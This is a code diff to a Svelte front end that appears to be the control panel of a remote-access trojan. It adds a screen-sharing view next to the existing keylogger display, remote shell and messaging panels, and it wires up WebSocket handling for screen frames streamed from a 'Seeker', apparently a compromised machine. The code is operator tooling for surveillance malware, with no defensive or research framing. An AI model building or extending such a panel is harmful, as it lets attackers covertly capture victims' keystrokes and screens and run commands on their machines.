@@ -7,6 +7,7 @@
 	import KeyloggerComponent from '$lib/components/KeyloggerComponent.svelte';
 	import InfoComponent from '$lib/components/InfoComponent.svelte';
 	import MessageComponent from '$lib/components/MessageComponent.svelte';
+	import ScreenShareComponent from '$lib/components/ScreenShareComponent.svelte';
 
 	let seeker: Seeker | null = null;
 	let ws: WebSocket | null = null;
@@ -14,6 +15,7 @@
 	const keylogs = writable<string[]>([]);
 	const shellOutput = writable<string[]>([]);
 	const shellRunning = writable(false);
+	const screenShareFrame = writable<string>('');
 
 	function decodeHtml(html: string): string {
 		const txt = document.createElement('textarea');
@@ -107,6 +109,12 @@
 					case 'shell_output':
 						shellOutput.update((arr) => [...arr, message.data as string]);
 						break;
+					case 'screenshare_frame':
+						screenShareFrame.set(message.data as string);
+						break;
+					case 'screenshare_output':
+						console.log('Screen share output:', message.data);
+						break;
 					default:
 						console.warn('Unknown message type:', message.type);
 				}
@@ -117,6 +125,7 @@
 
 		return () => {
 			ws?.close();
+			sendMessage('screenshare_command', 'stop');
 		};
 	});
 
@@ -134,6 +143,7 @@
 	<div class="p-6 bg-gray-800 rounded shadow-lg space-y-6">
 		<InfoComponent {seeker} {connected}/>
 		<ShellComponent {sendMessage} {shellRunning} {shellOutput} />
+		<ScreenShareComponent {sendMessage} {screenShareFrame} />
 		<KeyloggerComponent {keylogs} />
 		<MessageComponent {sendMessage} />
 	</div>
